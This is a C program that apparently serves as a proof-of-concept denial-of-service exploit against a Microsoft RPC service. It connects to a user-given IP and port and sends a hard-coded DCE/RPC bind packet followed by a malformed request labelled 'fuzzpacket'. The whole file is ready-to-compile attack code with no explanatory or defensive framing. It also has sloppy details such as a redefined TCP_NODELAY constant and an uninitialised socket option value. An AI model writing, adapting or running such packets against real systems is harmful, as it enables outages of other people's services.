#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <string.h>
#include <sys/signal.h>
#include <arpa/nameser.h>
#include <sys/time.h>
#include <time.h>
#include <errno.h>

#define TIMEOUT 3

#define TCP_NODELAY 0

char buf[8192];
char buf2[8192];

const char init[] =
"\x05\x00\x0B\x00\x10\x00\x00\x00\x48\x00\x00\x00\x01\x00\x00\x00"
"\x00\x10\x00\x10\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00"
"\x08\x83\xAF\xE1\x1F\x5D\xC9\x11\x91\xA4\x08\x00\x2B\x14\xA0\xFA"
"\x03\x00\x00\x00\x04\x5D\x88\x8A\xEB\x1C\xC9\x11\x9F\xE8\x08\x00"
"\x2B\x10\x48\x60\x02\x00\x00\x00";

const char fuzzpacket[] =
"\x05\x00\x00\x03\x10\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFF\xC8\x00";



int main(int argc, char *argv[]) 
{
	struct sockaddr_in addr;
	int s, port = 0, len, totalcounter, mu, last, seeder, x;
	char *host = NULL;
	unsigned int seed;
	struct timeval tv;

        if (argc < 3) 
	{
                fprintf(stderr, "Use: %s [ip] [port]\n", argv[0]);
                exit(1);
        }
	

	host = argv[1];
	port = atoi(argv[2]);
	if ((port < 1) || (port > 65535)) 
	{
		fprintf(stderr, "Port out of range (%d)\n", port);
		exit(1);
	}


        memset(&tv, 0, sizeof(tv));
        tv.tv_sec = TIMEOUT;
        tv.tv_usec = 0;


	memset(&addr, 0, sizeof(addr));


	signal(SIGPIPE, SIG_IGN); /* Ignore SIGPIPE */
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) 
	{
		fprintf(stderr, "Socket error: %s\n", strerror(errno));
		exit(EXIT_FAILURE);
	}
        setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));        //recv timeout
	setsockopt(s,IPPROTO_TCP,TCP_NODELAY,&x,sizeof(x));         //disable nagles alg.

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = inet_addr(host);
	if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) 
		exit(0);

	write(s,init,sizeof(init)-1);
	usleep(1000);
	write(s, fuzzpacket, sizeof(fuzzpacket)-1);
	sleep(5);
   	close(s);
}

